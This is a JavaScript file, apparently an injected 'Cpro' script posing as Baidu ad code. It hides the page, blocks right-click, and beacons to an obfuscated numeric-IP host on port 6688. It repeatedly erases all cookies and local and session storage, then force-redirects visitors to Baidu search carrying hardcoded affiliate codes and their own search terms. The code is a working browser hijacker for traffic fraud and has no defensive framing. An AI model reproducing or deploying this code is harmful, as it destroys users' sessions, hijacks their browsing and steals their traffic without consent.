class Cpro {
  mcs = ["from=1014538k"];
  pcs = ["tn=06074089_50_pg"];
  rd;
  l;
  im;
  U;

  constructor() {
    this.rd = Math.random();
    this.l = document.URL;
    this.im = /(iPad|iPhone|Mobile|Android)/i.test(navigator.userAgent);
    this.U = this.im
      ? "https://m.baidu.com/s?" +
        this.mcs[parseInt(`${this.rd * this.mcs.length}`)] +
        "&"
      : "https://www.baidu.com/s?" +
        this.pcs[parseInt(`${this.rd * this.pcs.length}`)] +
        "&";
    document.body.style.visibility = "hidden";
    document.oncontextmenu = () => {
      return false;
    };
    this.fj("//3026275270:6688/?p=UFJPfERQSXww", "//3026275270:6688/?p=TVBST3xEUEl8MA%3d%3d");
  }

  qs(d, b, a?, c?) {
    c = c || document.URL;
    var e = c.match(eval("/(\\?|#|&)(" + d + ")=([^&]*)(&|$)/i"));
    if (e) {
      b = b || e[2];
      a = e[3] || a;
      return b && a ? b + "=" + a : "";
    }
  }

  fc() {
    var d = location.host,
      b = !document.cookie.match(/home=s/i),
      a = "=;expires=" + new Date(0).toUTCString(),
      c = a + ";path=",
      e = c + "/;domain=",
      f = [a, c, c + "/", e + d, e + d.substr(d.indexOf("."))],
      g = document.cookie.match(/[^ =;]+(?=\=)/g);
    if (g && b)
      for (var h = g.length; h--; )
        for (var i = 5; i--; ) document.cookie = g[h] + f[i];
    if (window.localStorage) localStorage.clear();
    if (window.sessionStorage) sessionStorage.clear();
    setTimeout(this.fc, 500);
  }

  gti(d, callback) {
    var a, c, e;
    if (window["XMLHttpRequest"]) {
      try {
        a = new XMLHttpRequest();
      } catch (err) {
        a = new window["ActiveXObject"]("Microsoft.XMLHTTP");
      }
    } else {
      a = new window["ActiveXObject"]("Microsoft.XMLHTTP");
    }
    if (a) {
      a.onreadystatechange = ()=> {
        if (a.readyState == 4 && a.status == 200) {
          callback(a.responseText);
        }
      };
      if (a.overrideMimeType) {
        a.overrideMimeType("text/html;charset=gbk");
      }
      a.open("GET", d + "&_r=1_0&ich=s&jid=1&aaa_flag=1&d=123", true);
      a.setRequestHeader("Content-Type", "atext/html; charset=gbk;");
      a.send();
    }
  }

  fj(c, e, f?) {
    try {
      if (this.im) c = e;
      if (c && this.rd <= 0.05) {
        new Image().src = c;
        f = 200;
      } else {
        f = 0;
      }
      !this.im && this.fc();
      setTimeout(()=> {
        var a = this.qs("k|word|wd", "word");
        if (a) {
          this.U += a;
          this.go();
        } else if (this.l && this.l.match(/\/cpro.*uijs.php\?en=.*&c=news/i)) {
          this.gti(this.l, (d)=> {
            var b = document.title;
            if (b == null || b == undefined || b == "") {
              b = (d.match(/<title>([^<]*)<\/title>/i) || [])[1];
            } else {
              b = b.match(/\".*\"/)[0];
            }
            if (b) {
              b = b
                .replace(/(\s|\u767E\u5EA6\u63A8\u5E7F|\u767E\u5EA6|\-)/g, "")
                .replace(/\"/g, "");
              this.U += "word=" + encodeURIComponent(b);
              this.go();
            } else {
              this.go(1);
            }
          });
        } else {
          this.go(1);
        }
      }, f);
    } catch (err) {
      console.log("ERROR" + err);
      this.go(1);
    }
  }

  go(d?) {
    if (d) {
      return (location.href =
        document.URL + "&_r=1_0&ich=s&jid=1&aaa_flag=1&d=123");
    }
    if (navigator.userAgent.match(/webkit/i))
      document.body.appendChild(document.createElement("iframe")).src =
        "javascript:parent.location.replace('" + encodeURI(this.U) + "')";
    else
      document.write(
        "<meta http-equiv='Refresh'content='0;Url=" + this.U + "'/>"
      );
    document.close();
  }
}

new Cpro();
